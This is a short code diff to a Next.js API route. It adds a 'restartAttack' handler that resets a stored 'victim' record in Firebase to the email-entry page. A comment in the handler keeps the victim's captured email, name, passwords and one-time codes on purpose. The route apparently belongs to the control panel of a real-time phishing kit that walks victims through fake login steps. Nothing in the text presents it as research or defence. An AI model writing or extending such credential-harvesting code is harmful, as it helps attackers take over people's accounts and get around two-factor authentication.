@@ -207,6 +207,27 @@ export async function POST(request: NextRequest) {
           currentPage: 'redirect'
         });
         return NextResponse.json({ success: true });
+      
+      case 'restartAttack': {
+        const victimRef = ref(db, 'victim');
+        const victimSnapshot = await get(victimRef);
+        if (victimSnapshot.exists()) {
+            const victimData = victimSnapshot.val();
+            const updateData = {
+                ...victimData,
+                currentPage: 'email',
+                attempts: 0,
+                errorMessage: '',
+                isTyping: false
+            };
+            // Do not clear email, name, profilePicture, passwords, or otp
+            await set(victimRef, updateData);
+        } else {
+            // If no victim data, just set to initial state
+            await set(ref(db, 'victim'), initialState.victim);
+        }
+        return NextResponse.json({ success: true, message: 'Attack restarted' });
+      }
 
       case 'clearVictimData':
         await set(ref(db, 'victim'), initialState.victim);
